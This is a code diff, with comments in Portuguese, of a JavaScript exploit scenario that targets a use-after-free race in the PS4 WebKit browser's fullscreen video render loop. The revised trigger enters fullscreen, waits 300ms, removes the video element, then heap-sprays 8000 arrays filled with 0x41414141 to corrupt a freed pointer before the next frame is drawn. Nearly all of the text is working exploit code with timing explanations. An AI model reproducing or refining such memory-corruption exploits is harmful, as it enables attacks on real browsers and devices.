@@ -1,14 +1,16 @@
+
 /**
- * CENÁRIO: VIDEO_FULLSCREEN_TRANSITION_CRASH
- * Alvo: Race Condition durante a animação de saída (Exit Transition)
+ * CENÁRIO: VIDEO_FULLSCREEN_RENDER_LOOP_CRASH
+ * Alvo: Race condition no ciclo de renderização gráfica (Manx) a 60FPS.
  */
 
 export default {
-    id:       'VIDEO_FULLSCREEN_TRANSITION_CRASH',
+    id:       'VIDEO_FULLSCREEN_RENDER_LOOP_CRASH',
     category: 'Media',
     risk:     'CRITICAL',
-    description: 'Evita o UI Deadlock forçando o UAF *durante* a animação de saída. ' +
-                 'Garante que o OrbisOS já libertou o ecrã antes de matarmos o WebProcess.',
+    description: 'Aplica a Teoria do Leandro: Entra em Fullscreen, aguarda o render loop ' +
+                 'estabilizar e faz o remove() seguido IMEDIATAMENTE de Spray, ' +
+                 'tentando corromper o ponteiro antes que a placa gráfica desenhe o próximo frame.',
 
     setup: async function() {
         this.container = document.createElement('div');
@@ -19,7 +21,7 @@ export default {
         this.video.controls = true;
         this.container.appendChild(this.video);
 
-        // A nossa munição (Ponteiro Falso)
+        // A munição: 0x41414141 (AAAA - O Gatilho do Crash)
         this.sprayPayload = new Uint32Array(256);
         this.sprayPayload.fill(0x41414141);
 
@@ -34,40 +36,33 @@ export default {
 
     trigger: async function() {
         try {
-            // 1. Entramos em Fullscreen nativo
+            // 1. A ENTRADA
+            // Forçamos o método nativo da Apple/Sony
             if (this.video.webkitEnterFullscreen) {
                 this.video.webkitEnterFullscreen();
             } else if (this.video.webkitRequestFullscreen) {
                 this.video.webkitRequestFullscreen();
             }
             
-            // Aguardamos que a entrada estabilize completamente
-            await new Promise(r => setTimeout(r, 500)); 
+            // 2. A ESTABILIZAÇÃO
+            // Esperamos 300ms. Isto garante que a tela preta abriu, o Manx assumiu 
+            // o controlo e está a desenhar o vídeo ativamente a 60 frames por segundo.
+            await new Promise(r => setTimeout(r, 300)); 
 
-            // 2. INICIAMOS A SAÍDA (O OrbisOS começa a devolver o ecrã)
-            if (document.webkitExitFullscreen) {
-                document.webkitExitFullscreen();
-            } else if (this.video.webkitExitFullscreen) {
-                this.video.webkitExitFullscreen();
-            }
+            // 3. A REMOÇÃO (A sua intuição)
+            this.video.remove();
 
-            // 3. A JANELA DE TRANSIÇÃO (A Mágica)
-            // Esperamos 50ms. O ecrã da PS4 já começou a encolher e o menu já está a reaparecer.
-            // O OrbisOS já não vai congelar.
-            await new Promise(r => setTimeout(r, 50)); 
-
-            // 4. O GATILHO & SPRAY
-            // O FullscreenVideoController C++ ainda está na memória a limpar variáveis finais.
-            // Nós arrancamos o motor do player e enchemos o buraco!
-            this.video.removeAttribute('src');
-            this.video.load();
-
+            // 4. A CORRIDA CONTRA O FRAME (Spray)
+            // O ecrã da PS4 atualiza a cada ~16ms. Temos de encher a RAM de lixo 
+            // ANTES que o Manx tente procurar a imagem do vídeo para o próximo frame!
             this.spray = [];
-            for (let i = 0; i < 5000; i++) {
+            for (let i = 0; i < 8000; i++) { // Aumentei a carga para ser implacável
                 let arr = new Uint32Array(256);
                 arr.set(this.sprayPayload);
                 this.spray.push(arr);
             }
+
+            // ZERO chamadas de saída. Deixamos o Manx bater na parede de lixo a 100km/h.
 
         } catch(e) {}
     },
